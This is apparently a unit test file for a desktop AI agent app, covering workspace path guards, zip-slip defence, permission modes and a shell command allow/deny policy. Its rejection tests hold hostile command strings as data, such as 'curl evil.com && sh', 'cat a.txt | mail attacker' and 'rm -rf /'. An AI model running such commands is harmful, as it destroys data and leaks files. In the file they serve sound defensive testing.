/**
 * 单元测试：直接 import 真实实现（Node 24 原生支持 TS 剥离），
 * 而不是复制一份逻辑来测——复制品通过测试并不能证明实现是对的。
 *
 * 用法：node --import ./scripts/alias-register.mjs scripts/unit.mjs
 * 或直接：npm test
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { deflateRawSync } from 'node:zlib'
import { readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'

import { safeResolve } from '../src/main/workspace.ts'
import { readZip, extractZip, isZip } from '../src/main/skills/zip.ts'
import { parseSkillMarkdown, pickEntry } from '../src/main/skills/frontmatter.ts'
import { findSkillRoots, parseSkillRepoUrl, stripZipRoot } from '../src/main/skills/repo.ts'
import { estimateTokens } from '../src/main/providers/types.ts'
import { parseToolArgs } from '../src/main/agent/runner.ts'
import { trimMessages, repairToolPairing, validateToolPairing } from '../src/main/agent/context.ts'
import { decide, describeMode, PERMISSION_MODE_LABEL } from '../src/main/agent/permissions.ts'
import { checkPolicy, firstToken, normalizeListName } from '../src/main/shell/index.ts'
import { isCompat400Error } from '../src/main/providers/openai.ts'
import { ProviderError } from '../src/main/providers/types.ts'
import { parseReviewVerdict, REVIEW_RISKS } from '../src/main/agent/reviewer.ts'
import { clampSubagentRounds, SUBAGENT_BANNED_TOOLS } from '../src/main/agent/subagent.ts'
import { buildTools, toolsForMode, MINIMAL_TOOL_NAMES, PTC_TOOL_NAMES } from '../src/main/agent/tools.ts'
import { setPlan, updatePlanStep, getPlan, clearPlan, formatPlan } from '../src/main/agent/ptcPlan.ts'
import { bezierPath, resolveVirtualKey } from '../src/main/screen/index.ts'
import { pathEscapesWorkspace } from '../src/main/agent/tools.ts'
import { groupMessagesForView, summarizeTools, toolLabel } from '../src/renderer/src/lib/footprint.ts'
import {
  BACKUP_REMOTE_NAME,
  BackupManager,
  buildBackupRemoteUrl,
  clampIntervalMinutes,
  formatBackupMessage,
  redactSecrets,
  sanitizeBranch,
  validateBackupConfig
} from '../src/main/backup.ts'
import {
  cacheHitRate,
  estimateCost,
  lookupPrice,
  aggregate,
  addUsage,
  emptyUsage
} from '../src/shared/pricing.ts'

/* ------------------------------------------------------------------ */
/* 路径越界防护（安全关键）                                             */
/* ------------------------------------------------------------------ */

const ROOT = process.platform === 'win32' ? 'C:\\ws\\proj' : '/ws/proj'

test('safeResolve 允许工作区内的常规路径', () => {
  assert.ok(safeResolve(ROOT, 'src/index.ts'))
  assert.ok(safeResolve(ROOT, 'a/b/c/d.txt'))
  assert.ok(safeResolve(ROOT, './src/./x.ts'))
  assert.equal(safeResolve(ROOT, ''), ROOT.replace(/[\\/]$/, ''))
})

test('safeResolve 拒绝 ../ 逃逸', () => {
  assert.throws(() => safeResolve(ROOT, '../secret.txt'), /越界/)
  assert.throws(() => safeResolve(ROOT, '../../etc/passwd'), /越界/)
  assert.throws(() => safeResolve(ROOT, 'src/../../out.txt'), /越界/)
  assert.throws(() => safeResolve(ROOT, 'a/b/../../../x'), /越界/)
})

test('safeResolve 拒绝绝对路径与非法字符', () => {
  assert.throws(() => safeResolve(ROOT, '\0bad'), /非法字符/)
  // 绝对路径一律拒绝：静默把 /etc/passwd 当成 <ws>/etc/passwd 是危险语义
  assert.throws(() => safeResolve(ROOT, 'D:\\other\\file.txt'), /绝对路径/)
  assert.throws(() => safeResolve(ROOT, '/etc/passwd'), /绝对路径/)
  assert.throws(() => safeResolve(ROOT, '//server/share/x'), /绝对路径/)
  assert.throws(() => safeResolve(ROOT, 'C:/Windows/system32'), /绝对路径/)
})

test('safeResolve 允许含 .. 但最终仍落在根内的路径', () => {
  const p = safeResolve(ROOT, 'src/a/../b.ts')
  assert.ok(p.endsWith('b.ts'))
  assert.ok(!p.includes('..'))
})

/* ------------------------------------------------------------------ */
/* ZIP：解析、解压、zip-slip 防护                                       */
/* ------------------------------------------------------------------ */

/** 手工构造 zip，覆盖 store(0) 与 deflate(8) */
function buildZip(entries) {
  const chunks = []
  const central = []
  let offset = 0

  for (const e of entries) {
    const nameBuf = Buffer.from(e.name, 'utf8')
    const raw = Buffer.from(e.data)
    const useDeflate = e.deflate === true
    const stored = useDeflate ? deflateRawSync(raw) : raw
    const method = useDeflate ? 8 : 0

    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0)
    local.writeUInt16LE(20, 4)
    local.writeUInt16LE(method, 8)
    local.writeUInt32LE(0, 14)
    local.writeUInt32LE(stored.length, 18)
    local.writeUInt32LE(raw.length, 22)
    local.writeUInt16LE(nameBuf.length, 26)
    chunks.push(local, nameBuf, stored)

    const cd = Buffer.alloc(46)
    cd.writeUInt32LE(0x02014b50, 0)
    cd.writeUInt16LE(20, 4)
    cd.writeUInt16LE(20, 6)
    cd.writeUInt16LE(method, 10)
    cd.writeUInt32LE(0, 16)
    cd.writeUInt32LE(stored.length, 20)
    cd.writeUInt32LE(raw.length, 24)
    cd.writeUInt16LE(nameBuf.length, 28)
    cd.writeUInt32LE(offset, 42)
    central.push(Buffer.concat([cd, nameBuf]))

    offset += local.length + nameBuf.length + stored.length
  }

  const centralBuf = Buffer.concat(central)
  const eocd = Buffer.alloc(22)
  eocd.writeUInt32LE(0x06054b50, 0)
  eocd.writeUInt16LE(entries.length, 8)
  eocd.writeUInt16LE(entries.length, 10)
  eocd.writeUInt32LE(centralBuf.length, 12)
  eocd.writeUInt32LE(offset, 16)
  return Buffer.concat([...chunks, centralBuf, eocd])
}

test('isZip 正确识别 zip 签名', () => {
  assert.equal(isZip(buildZip([{ name: 'a.txt', data: 'x' }])), true)
  assert.equal(isZip(Buffer.from('not a zip at all')), false)
  assert.equal(isZip(Buffer.alloc(2)), false)
})

test('readZip 解析 store 与 deflate 两种压缩方式', () => {
  const zip = buildZip([
    { name: 'SKILL.md', data: '# 我的技能' },
    { name: 'assets/big.txt', data: 'y'.repeat(5000), deflate: true }
  ])
  const entries = readZip(zip)
  assert.equal(entries.length, 2)
  assert.equal(entries[0].name, 'SKILL.md')
  assert.equal(entries[0].data.toString('utf8'), '# 我的技能', 'store 条目内容应一致')
  assert.equal(entries[1].name, 'assets/big.txt')
  assert.equal(entries[1].data.length, 5000, 'deflate 条目应正确解压')
  assert.equal(entries[1].data.toString('utf8'), 'y'.repeat(5000))
})

test('readZip 对损坏输入明确报错', () => {
  assert.throws(() => readZip(Buffer.alloc(4)), /太小|损坏/)
  assert.throws(() => readZip(Buffer.from('x'.repeat(100))), /找不到|损坏/)
})

test('extractZip 正确落盘并返回文件列表', () => {
  const zip = buildZip([
    { name: 'SKILL.md', data: 'hello' },
    { name: 'sub/a.txt', data: 'aaa' }
  ])
  const entries = readZip(zip)
  const written = new Map()
  const dirs = []
  const res = extractZip(
    entries,
    '/tmp/skill',
    {
      mkdirSync: (p) => dirs.push(p),
      writeFileSync: (p, d) => written.set(p.replace(/\\/g, '/'), d.toString('utf8'))
    },
    {
      join: (...p) => p.join('/'),
      resolve: (...p) => {
        // 用 path.posix 语义模拟，测试 zip-slip 判断
        const parts = []
        for (const seg of p.join('/').split('/')) {
          if (seg === '' || seg === '.') continue
          if (seg === '..') parts.pop()
          else parts.push(seg)
        }
        return '/' + parts.join('/')
      },
      relative: (a, b) => {
        const norm = (s) => s.split('/').filter(Boolean)
        const aa = norm(a)
        const bb = norm(b)
        let i = 0
        while (i < aa.length && aa[i] === bb[i]) i++
        return [...aa.slice(i).map(() => '..'), ...bb.slice(i)].join('/') || ''
      }
    }
  )
  assert.equal(res.files.length, 2)
  assert.ok(written.has('/tmp/skill/SKILL.md'))
  assert.equal(written.get('/tmp/skill/SKILL.md'), 'hello')
  assert.equal(written.get('/tmp/skill/sub/a.txt'), 'aaa')
  assert.equal(res.totalBytes, 8)
})

test('extractZip 拒绝 zip-slip 越界路径', () => {
  const zip = buildZip([{ name: '../../evil.sh', data: 'rm -rf /' }])
  const entries = readZip(zip)
  assert.throws(
    () =>
      extractZip(
        entries,
        '/tmp/skill',
        { mkdirSync: () => undefined, writeFileSync: () => undefined },
        {
          join: (...p) => p.join('/'),
          resolve: (...p) => {
            const parts = []
            for (const seg of p.join('/').split('/')) {
              if (seg === '' || seg === '.') continue
              if (seg === '..') parts.pop()
              else parts.push(seg)
            }
            return '/' + parts.join('/')
          },
          relative: (a, b) => {
            const norm = (s) => s.split('/').filter(Boolean)
            const aa = norm(a)
            const bb = norm(b)
            let i = 0
            while (i < aa.length && aa[i] === bb[i]) i++
            return [...aa.slice(i).map(() => '..'), ...bb.slice(i)].join('/') || ''
          }
        }
      ),
    /越界/
  )
})

test('extractZip 遵守文件数与体积上限', () => {
  const zip = buildZip([
    { name: 'a.txt', data: 'x' },
    { name: 'b.txt', data: 'y' }
  ])
  const entries = readZip(zip)
  assert.throws(
    () =>
      extractZip(
        entries,
        '/t',
        { mkdirSync: () => undefined, writeFileSync: () => undefined },
        { join: (...p) => p.join('/'), resolve: (...p) => '/' + p.join('/'), relative: () => 'ok' },
        { maxFiles: 1, maxTotalBytes: 1e6, maxFileBytes: 1e6 }
      ),
    /上限/
  )
})

/* ------------------------------------------------------------------ */
/* Skill frontmatter 解析                                              */
/* ------------------------------------------------------------------ */

test('parseSkillMarkdown 解析 frontmatter 的 name/description', () => {
  const r = parseSkillMarkdown(
    ['---', 'name: banner-design', 'description: 设计横幅与社交图', 'version: 1.2.0', '---', '', '# 正文', '内容'].join('\n')
  )
  assert.equal(r.name, 'banner-design')
  assert.equal(r.description, '设计横幅与社交图')
  assert.equal(r.extra.version, '1.2.0')
  assert.ok(r.body.includes('# 正文'))
})

test('parseSkillMarkdown 去除成对引号', () => {
  const r = parseSkillMarkdown('---\nname: "quoted name"\ndescription: \'单引号\'\n---\nbody')
  assert.equal(r.name, 'quoted name')
  assert.equal(r.description, '单引号')
})

test('parseSkillMarkdown 无 frontmatter 时用首段兜底', () => {
  const r = parseSkillMarkdown('# 标题\n\n这是第一段说明文字。\n\n更多内容')
  assert.equal(r.name, null)
  assert.equal(r.description, '这是第一段说明文字。')
})

test('parseSkillMarkdown 处理仅标题无正文的情况', () => {
  const r = parseSkillMarkdown('# 只有标题')
  assert.equal(r.description, '')
})

test('parseSkillMarkdown 剥离 BOM', () => {
  const r = parseSkillMarkdown('\uFEFF---\nname: bom-test\n---\nbody')
  assert.equal(r.name, 'bom-test')
})

test('parseSkillMarkdown 支持块标量 description', () => {
  const r = parseSkillMarkdown(
    ['---', 'name: multi', 'description: >', '  第一行说明', '  第二行说明', '---', 'body'].join('\n')
  )
  assert.equal(r.name, 'multi')
  assert.match(r.description, /第一行说明/)
  assert.match(r.description, /第二行说明/)
})

/* ------------------------------------------------------------------ */
/* 入口文件挑选                                                        */
/* ------------------------------------------------------------------ */

test('pickEntry 优先根目录 SKILL.md', async () => {
  assert.equal(await pickEntry(['README.md', 'SKILL.md', 'a.txt']), 'SKILL.md')
})

test('pickEntry 在无根入口时向内找一层（zip 常见结构）', async () => {
  assert.equal(await pickEntry(['my-skill/SKILL.md', 'my-skill/notes.txt']), 'my-skill/SKILL.md')
})

test('pickEntry 回落到任意 markdown', async () => {
  assert.equal(await pickEntry(['docs/guide.md']), 'docs/guide.md')
})

test('pickEntry 无 markdown 时明确报错', async () => {
  await assert.rejects(() => pickEntry(['a.txt', 'b.json']), /未找到/)
})

/* ------------------------------------------------------------------ */
/* token 估算                                                          */
/* ------------------------------------------------------------------ */

test('estimateTokens 对空输入返回 0', () => {
  assert.equal(estimateTokens(''), 0)
})

test('estimateTokens 中文约 1 token/字', () => {
  assert.equal(estimateTokens('你好世界'), 4)
  assert.equal(estimateTokens('中文测试内容'), 6)
})

test('estimateTokens 英文约 4 字符/token', () => {
  assert.equal(estimateTokens('abcdefgh'), 2)
  assert.equal(estimateTokens('a'.repeat(100)), 25)
})

test('estimateTokens 中英混排与日韩文字', () => {
  const mixed = estimateTokens('hello 世界')
  assert.ok(mixed >= 3)
  assert.ok(estimateTokens('こんにちは') === 5, '日文假名按 CJK 计')
  assert.ok(estimateTokens('한국어') === 3, '韩文按 CJK 计')
})

/* ------------------------------------------------------------------ */
/* 工具参数解析容错                                                     */
/* ------------------------------------------------------------------ */

test('parseToolArgs 处理标准与包裹的 JSON', () => {
  assert.deepEqual(parseToolArgs('{"path":"a.ts"}'), { path: 'a.ts' })
  assert.deepEqual(parseToolArgs('```json\n{"path":"a.ts"}\n```'), { path: 'a.ts' })
  assert.deepEqual(parseToolArgs('```\n{"path":"a.ts"}\n```'), { path: 'a.ts' })
})

test('parseToolArgs 修复尾随逗号', () => {
  assert.deepEqual(parseToolArgs('{"a":1,}'), { a: 1 })
  assert.deepEqual(parseToolArgs('{"a":[1,2,]}'), { a: [1, 2] })
})

test('parseToolArgs 空输入返回空对象', () => {
  assert.deepEqual(parseToolArgs(''), {})
  assert.deepEqual(parseToolArgs('   '), {})
})

test('parseToolArgs 拒绝数组与非法 JSON', () => {
  assert.deepEqual(parseToolArgs('[1,2]'), {}, '数组不是合法参数对象')
  assert.throws(() => parseToolArgs('{bad json'), /JSON/)
})

/* ------------------------------------------------------------------ */
/* 上下文配对修复（防供应商 400）                                        */
/* ------------------------------------------------------------------ */

test('validateToolPairing 检出孤立 tool 结果', () => {
  const problems = validateToolPairing([{ role: 'tool', toolCallId: 'orphan', content: 'x' }])
  assert.equal(problems.length, 1)
  assert.match(problems[0], /找不到/)
})

test('validateToolPairing 检出缺少结果的调用', () => {
  const problems = validateToolPairing([
    { role: 'assistant', content: '', toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }] }
  ])
  assert.equal(problems.length, 1)
  assert.match(problems[0], /缺少/)
})

test('repairToolPairing 剔除孤立 tool 结果', () => {
  const { messages, repairs } = repairToolPairing([
    { role: 'user', content: 'hi', id: '1', createdAt: 0 },
    { role: 'tool', toolCallId: 'orphan', content: 'stray', id: '2', createdAt: 0 }
  ])
  assert.equal(messages.length, 1)
  assert.equal(messages[0].role, 'user')
  assert.ok(repairs.length > 0)
})

test('repairToolPairing 完整保留配对的消息', () => {
  const { messages, repairs } = repairToolPairing([
    { role: 'user', content: 'hi', id: '1', createdAt: 0 },
    {
      role: 'assistant',
      content: '',
      id: '2',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'read_file', argsJson: '{}' }]
    },
    { role: 'tool', toolCallId: 'c1', content: 'body', id: '3', createdAt: 0 }
  ])
  assert.equal(messages.length, 3)
  assert.equal(repairs.length, 0, '配对完整时不应产生修复')
})

test('repairToolPairing 剔除缺结果的调用但保留文本', () => {
  const { messages } = repairToolPairing([
    {
      role: 'assistant',
      content: '让我看看',
      id: '1',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }]
    }
  ])
  assert.equal(messages.length, 1)
  assert.equal(messages[0].toolCalls, undefined)
  assert.equal(messages[0].content, '让我看看')
})

test('repairToolPairing 丢弃无文本且无结果的空 assistant', () => {
  const { messages } = repairToolPairing([
    {
      role: 'assistant',
      content: '   ',
      id: '1',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }]
    }
  ])
  assert.equal(messages.length, 0)
})

test('trimMessages 裁剪后首条不是孤立 tool 结果', () => {
  const msgs = [
    { role: 'user', content: '1', id: '1', createdAt: 0 },
    { role: 'assistant', content: 'a2', id: '2', createdAt: 0 },
    { role: 'user', content: '2', id: '3', createdAt: 0 },
    {
      role: 'assistant',
      content: '',
      id: '4',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }]
    },
    { role: 'tool', toolCallId: 'c1', content: 'r', id: '5', createdAt: 0 },
    { role: 'assistant', content: 'a5', id: '6', createdAt: 0 }
  ]
  const trimmed = trimMessages(msgs, 3)
  assert.notEqual(trimmed[0].role, 'tool', '首条不能是 tool')
  assert.deepEqual(validateToolPairing(trimmed), [], '裁剪结果必须是合法序列')
})

test('trimMessages 在有 tool 结果时保留其调用', () => {
  const msgs = [
    { role: 'user', content: 'q', id: '1', createdAt: 0 },
    {
      role: 'assistant',
      content: '',
      id: '2',
      createdAt: 0,
      toolCalls: [{ id: 'c1', name: 'x', argsJson: '{}' }]
    },
    { role: 'tool', toolCallId: 'c1', content: 'r', id: '3', createdAt: 0 },
    { role: 'assistant', content: 'final', id: '4', createdAt: 0 }
  ]
  const trimmed = trimMessages(msgs, 2)
  assert.deepEqual(validateToolPairing(trimmed), [], '不能产生半截配对')
})

test('trimMessages limit 为 0 时不裁剪', () => {
  const msgs = [{ role: 'user', content: 'x', id: '1', createdAt: 0 }]
  assert.equal(trimMessages(msgs, 0).length, 1)
})

/* ------------------------------------------------------------------ */
/* 用量核算与价格                                                      */
/* ------------------------------------------------------------------ */

test('cacheHitRate 按 命中/总输入 计算', () => {
  assert.equal(cacheHitRate({ inputTokens: 1000, cachedInputTokens: 0 }), 0)
  assert.equal(cacheHitRate({ inputTokens: 1000, cachedInputTokens: 1000 }), 1)
  assert.equal(cacheHitRate({ inputTokens: 1000, cachedInputTokens: 250 }), 0.25)
})

test('cacheHitRate 输入为 0 时返回 0 而非 NaN', () => {
  const r = cacheHitRate({ inputTokens: 0, cachedInputTokens: 0 })
  assert.equal(r, 0)
  assert.ok(!Number.isNaN(r))
})

test('addUsage 累加且 estimated 取或', () => {
  const a = { ...emptyUsage(), inputTokens: 10, outputTokens: 5 }
  const b = { ...emptyUsage(), inputTokens: 3, cachedInputTokens: 2, estimated: true }
  const sum = addUsage(a, b)
  assert.equal(sum.inputTokens, 13)
  assert.equal(sum.outputTokens, 5)
  assert.equal(sum.cachedInputTokens, 2)
  assert.equal(sum.estimated, true)
})

test('lookupPrice 命中精确名与带日期后缀的版本', () => {
  assert.ok(lookupPrice('gpt-4o'))
  assert.ok(lookupPrice('claude-sonnet-4-20250514'), '应命中前缀')
})

test('lookupPrice 对未知模型返回 null 而不是猜价格', () => {
  assert.equal(lookupPrice('totally-unknown-model-xyz'), null)
  assert.equal(lookupPrice(''), null)
})

test('lookupPrice 更长的前缀优先', () => {
  const mini = lookupPrice('gpt-4o-mini')
  const full = lookupPrice('gpt-4o')
  assert.ok(mini && full)
  assert.ok(mini.input < full.input, 'mini 应命中更便宜的价格')
})

test('estimateCost 区分缓存与未缓存输入，不重复计费', () => {
  const model = 'claude-sonnet-4'
  const allFresh = estimateCost(
    { ...emptyUsage(), inputTokens: 1_000_000, outputTokens: 0 },
    model
  )
  const halfCached = estimateCost(
    { ...emptyUsage(), inputTokens: 1_000_000, cachedInputTokens: 1_000_000, outputTokens: 0 },
    model
  )
  assert.ok(allFresh != null && halfCached != null)
  assert.ok(halfCached < allFresh, '缓存命中的输入应更便宜')
  // 全命中缓存时只应按 cachedInput 计价（3.0 * 0.1 = 0.3）
  assert.ok(Math.abs(halfCached - 0.3) < 1e-9, `期望 0.3，实际 ${halfCached}`)
})

test('estimateCost 未知模型返回 null', () => {
  assert.equal(estimateCost({ ...emptyUsage(), inputTokens: 100 }, 'no-such-model'), null)
})

test('aggregate 汇总请求数与命中率', () => {
  const base = {
    at: 0,
    providerId: 'p',
    providerName: 'P',
    kind: 'openai',
    model: 'gpt-4o',
    latencyMs: 1000,
    firstTokenMs: 200,
    tokensPerSecond: 50,
    costUSD: 0.01,
    sessionId: 's',
    failed: false
  }
  const stats = aggregate([
    { ...base, ...emptyUsage(), id: '1', inputTokens: 1000, cachedInputTokens: 800, outputTokens: 100 },
    { ...base, ...emptyUsage(), id: '2', inputTokens: 1000, cachedInputTokens: 200, outputTokens: 300 }
  ])
  assert.equal(stats.requests, 2)
  assert.equal(stats.inputTokens, 2000)
  assert.equal(stats.outputTokens, 400)
  assert.equal(stats.cachedInputTokens, 1000)
  assert.equal(stats.cacheHitRate, 0.5)
  assert.equal(stats.avgFirstTokenMs, 200)
  assert.ok(Math.abs(stats.costUSD - 0.02) < 1e-9)
})

test('aggregate 对空记录集返回零值而非崩溃', () => {
  const stats = aggregate([])
  assert.equal(stats.requests, 0)
  assert.equal(stats.cacheHitRate, 0)
  assert.equal(stats.avgTokensPerSecond, 0)
})

/* ------------------------------------------------------------------ */
/* 权限判定（安全关键）                                                 */
/* ------------------------------------------------------------------ */

const basePolicy = {
  escapesWorkspace: false,
  allowWrite: true,
  capabilityEnabled: true,
  capabilityLabel: '该能力'
}

test('decide：full 模式一切放行', () => {
  for (const risk of ['read', 'write', 'delete', 'remote', 'shell', 'screen']) {
    assert.equal(decide({ ...basePolicy, mode: 'full', risk }).action, 'allow', `full 下 ${risk} 应放行`)
  }
})

test('decide：workspace 模式只放行工作区内写入', () => {
  assert.equal(decide({ ...basePolicy, mode: 'workspace', risk: 'read' }).action, 'allow')
  assert.equal(decide({ ...basePolicy, mode: 'workspace', risk: 'write' }).action, 'allow')
  // 越界写入必须问
  assert.equal(
    decide({ ...basePolicy, mode: 'workspace', risk: 'write', escapesWorkspace: true }).action,
    'ask'
  )
  for (const risk of ['delete', 'remote', 'shell', 'screen']) {
    assert.equal(decide({ ...basePolicy, mode: 'workspace', risk }).action, 'ask', `workspace 下 ${risk} 应询问`)
  }
})

test('decide：smart 模式只读放行，其余询问', () => {
  assert.equal(decide({ ...basePolicy, mode: 'smart', risk: 'read' }).action, 'allow')
  for (const risk of ['write', 'delete', 'remote', 'shell', 'screen']) {
    assert.equal(decide({ ...basePolicy, mode: 'smart', risk }).action, 'ask', `smart 下 ${risk} 应询问`)
  }
})

test('decide：模型自评 high 只加重视觉提示，绝不放宽判定', () => {
  const high = { level: 'high', reason: '会删除用户数据' }
  // full 模式下依然是 allow——自评不改变判定结果
  assert.equal(decide({ ...basePolicy, mode: 'full', risk: 'delete', selfAssessed: high }).action, 'allow')

  const smart = decide({ ...basePolicy, mode: 'smart', risk: 'write', selfAssessed: high })
  assert.equal(smart.action, 'ask')
  assert.equal(smart.escalate, true)
  assert.match(smart.reason, /删除用户数据/)

  // 自评 low 也不能让 smart 放行写操作
  const low = { level: 'low', reason: '只是改个注释' }
  assert.equal(decide({ ...basePolicy, mode: 'smart', risk: 'write', selfAssessed: low }).action, 'ask')
})

test('decide：能力总开关关闭时任何模式都拒绝', () => {
  for (const mode of ['full', 'workspace', 'smart']) {
    const d = decide({ ...basePolicy, mode, risk: 'shell', capabilityEnabled: false, capabilityLabel: '控制台' })
    assert.equal(d.action, 'deny', `${mode} 下关闭能力应拒绝`)
    assert.match(d.reason, /控制台/)
  }
  // 连完全权限也不能绕过用户的显式关闭
  assert.equal(
    decide({ ...basePolicy, mode: 'full', risk: 'screen', capabilityEnabled: false, capabilityLabel: '屏幕' }).action,
    'deny'
  )
})

test('decide：写入总开关关闭时拒绝有副作用的操作，但只读仍放行', () => {
  const off = { ...basePolicy, allowWrite: false }
  assert.equal(decide({ ...off, mode: 'full', risk: 'read' }).action, 'allow')
  for (const risk of ['write', 'delete', 'remote', 'shell']) {
    assert.equal(decide({ ...off, mode: 'full', risk }).action, 'deny', `${risk} 在关闭写入时应拒绝`)
  }
})

/* ------------------------------------------------------------------ */
/* 控制台命令策略（安全关键）                                           */
/* ------------------------------------------------------------------ */

const strictPolicy = { allowlist: [], denylist: ['format', 'shutdown'], allowPipe: false }

test('checkPolicy 拒绝空命令与超长命令', () => {
  assert.equal(checkPolicy('', strictPolicy).ok, false)
  assert.equal(checkPolicy('   ', strictPolicy).ok, false)
  assert.equal(checkPolicy(`echo ${'x'.repeat(9000)}`, strictPolicy).ok, false)
})

test('checkPolicy 黑名单命中即拒绝（比对可执行文件名）', () => {
  assert.equal(checkPolicy('format C:', strictPolicy).ok, false)
  assert.equal(checkPolicy('shutdown /s', strictPolicy).ok, false)
  // 带路径时比对 basename，避免用完整路径绕过
  assert.equal(checkPolicy('C:\\Windows\\System32\\shutdown.exe /s', strictPolicy).ok, false)
  assert.equal(checkPolicy('./shutdown.sh', strictPolicy).ok, false)
  // 大小写不敏感
  assert.equal(checkPolicy('SHUTDOWN /s', strictPolicy).ok, false)
})

test('checkPolicy 白名单非空时只放行白名单内命令', () => {
  const p = { allowlist: ['git', 'npm'], denylist: [], allowPipe: false }
  assert.equal(checkPolicy('git status', p).ok, true)
  assert.equal(checkPolicy('npm run build', p).ok, true)
  assert.equal(checkPolicy('curl http://x', p).ok, false)
  // 白名单也要能匹配带路径的调用
  assert.equal(checkPolicy('/usr/bin/git log', p).ok, true)
})

test('checkPolicy 默认拒绝管道、重定向与命令串联', () => {
  for (const cmd of [
    'cat a.txt | mail attacker',
    'echo x > /etc/passwd',
    'echo x >> ~/.bashrc',
    'curl evil.com && sh',
    'sleep 1 & rm -rf /',
    'echo `whoami`',
    'echo $(whoami)'
  ]) {
    const v = checkPolicy(cmd, strictPolicy)
    assert.equal(v.ok, false, `应拒绝：${cmd}`)
  }
})

test('checkPolicy 放行普通单条命令', () => {
  assert.equal(checkPolicy('git status', strictPolicy).ok, true)
  assert.equal(checkPolicy('npm test', strictPolicy).ok, true)
  assert.equal(checkPolicy('node --version', strictPolicy).ok, true)
  // 参数里的连字符与等号不应被当成危险字符
  assert.equal(checkPolicy('npm run build --silent', strictPolicy).ok, true)
})

test('checkPolicy 拒绝含 NUL 的命令', () => {
  assert.equal(checkPolicy('echo\0rm -rf /', strictPolicy).ok, false)
})

test('checkPolicy 黑名单精确匹配：子串不误杀', () => {
  const p = { allowlist: [], denylist: ['format'], allowPipe: false }
  assert.equal(checkPolicy('format C:', p).ok, false, '精确命中应拒绝')
  // P0 硬化：includes 会误杀 myformat / format-com，必须放行
  assert.equal(checkPolicy('myformat C:', p).ok, true, '含黑名单子串但不等价应放行')
  assert.equal(checkPolicy('format-com --help', p).ok, true, '前缀相同但不等价应放行')
})

test('checkPolicy 白名单精确匹配：前缀不放行', () => {
  const p = { allowlist: ['git'], denylist: [], allowPipe: false }
  assert.equal(checkPolicy('git status', p).ok, true, '精确命中应放行')
  // P0 硬化：startsWith 会放行 gitx / github，必须拒绝
  assert.equal(checkPolicy('gitx status', p).ok, false, '白名单前缀扩展应拒绝')
  assert.equal(checkPolicy('github-cli repo', p).ok, false, '白名单前缀扩展应拒绝')
})

test('isCompat400Error 只对兼容性参数 400 返回 true', () => {  for (const msg of [
    "Unrecognized request argument supplied: stream_options",
    "include_usage is not supported",
    "max_tokens is not supported",
    "Use max_completion_tokens instead",
    "temperature is not supported for this model"
  ]) {
    assert.equal(isCompat400Error(new ProviderError(msg, 400, msg)), true, `应重试：${msg}`)
  }
  for (const msg of [
    "Invalid tool_choice",
    "missing required field messages",
    "rate limit exceeded",
    "model not found"
  ]) {
    assert.equal(isCompat400Error(new ProviderError(msg, 400, msg)), false, `不应重试：${msg}`)
  }
})

test('normalizeListName 与 token 走同一条 basename 变换', () => {
  assert.equal(normalizeListName('shutdown.exe'), 'shutdown')
  assert.equal(normalizeListName('  GIT.CMD '), 'git')
  assert.equal(normalizeListName('C:\\Tools\\mytool.bat'), 'mytool')
  // 名单写带扩展名时仍能命中脱扩展后的 token（否则是静默旁路）
  const p = { allowlist: [], denylist: ['shutdown.exe'], allowPipe: false }
  assert.equal(checkPolicy('shutdown /s', p).ok, false, '名单 shutdown.exe 应拦住 shutdown')
  const q = { allowlist: ['git.exe'], denylist: [], allowPipe: false }
  assert.equal(checkPolicy('git status', q).ok, true, '名单 git.exe 应放行 git')
})

test('parseReviewVerdict 正常解析三种结论，脏输出一律 escalate', () => {
  assert.deepEqual(parseReviewVerdict('{"verdict":"approve","reason":"ok"}'), { verdict: 'approve', reason: 'ok' })
  assert.deepEqual(parseReviewVerdict('```json\n{"verdict":"deny","reason":"危险"}\n```'), { verdict: 'deny', reason: '危险' })
  assert.deepEqual(parseReviewVerdict('前言 {"verdict":"escalate","reason":"拿不准"} 后记'), { verdict: 'escalate', reason: '拿不准' })
  for (const bad of ['', '   ', '不是 json', '{"verdict":"xxx"}', '[1,2]']) {
    assert.equal(parseReviewVerdict(bad).verdict, 'escalate', `脏输出应转人工：${bad.slice(0, 20)}`)
  }
})

test('REVIEW_RISKS 只覆盖 shell/delete/remote/screen（write 已有 diff 卡片，不重复烧 token）', () => {
  for (const r of ['shell', 'delete', 'remote', 'screen']) assert.equal(REVIEW_RISKS.has(r), true)
  assert.equal(REVIEW_RISKS.has('read'), false)
  assert.equal(REVIEW_RISKS.has('write'), false)
})

test('clampSubagentRounds 钳制 1~10，非数字回默认 6', () => {
  assert.equal(clampSubagentRounds(0), 1)
  assert.equal(clampSubagentRounds(3), 3)
  assert.equal(clampSubagentRounds(99), 10)
  assert.equal(clampSubagentRounds('xx'), 6)
  assert.equal(clampSubagentRounds(undefined), 6)
})

test('spawn_subagent 已注册、禁在子代理内再派生、无执行器时明确报错', async () => {
  const tools = buildTools({ ws: {}, maxReadBytes: 1024, github: { enabled: () => false } })
  const names = tools.map((t) => t.schema.name)
  assert.ok(names.includes('spawn_subagent'), '主 run 工具集应含 spawn_subagent')
  assert.ok(SUBAGENT_BANNED_TOOLS.has('spawn_subagent'), '子代理内必须剔掉 spawn_subagent（深度恒为 1）')
  const def = tools.find((t) => t.schema.name === 'spawn_subagent')
  const ctx = {
    workspace: null,
    sessionId: 's',
    emit: () => undefined,
    runId: 'r',
    allowWrite: true,
    permissionMode: 'smart',
    signal: AbortSignal.timeout(1000)
  }
  const r = await def.run({ task: 'hello' }, ctx)
  assert.equal(r.ok, false)
  assert.match(r.content, /不支持子代理/)
})

test('usage 落盘有大小轮转（防 JSONL 无限涨）', () => {
  const src = readFileSync('src/main/usage.ts', 'utf8')
  assert.ok(src.includes('rotateIfNeeded'), 'usage.ts 应有 rotateIfNeeded')
  assert.ok(src.includes('MAX_FILE_BYTES'), '应有单文件上限常量')
  assert.ok(src.includes('MAX_FILES'), '应有保留文件数上限')
})

test('sessions.save 落盘前剥离 images（防截图写盘）', () => {
  const src = readFileSync('src/main/sessions.ts', 'utf8')
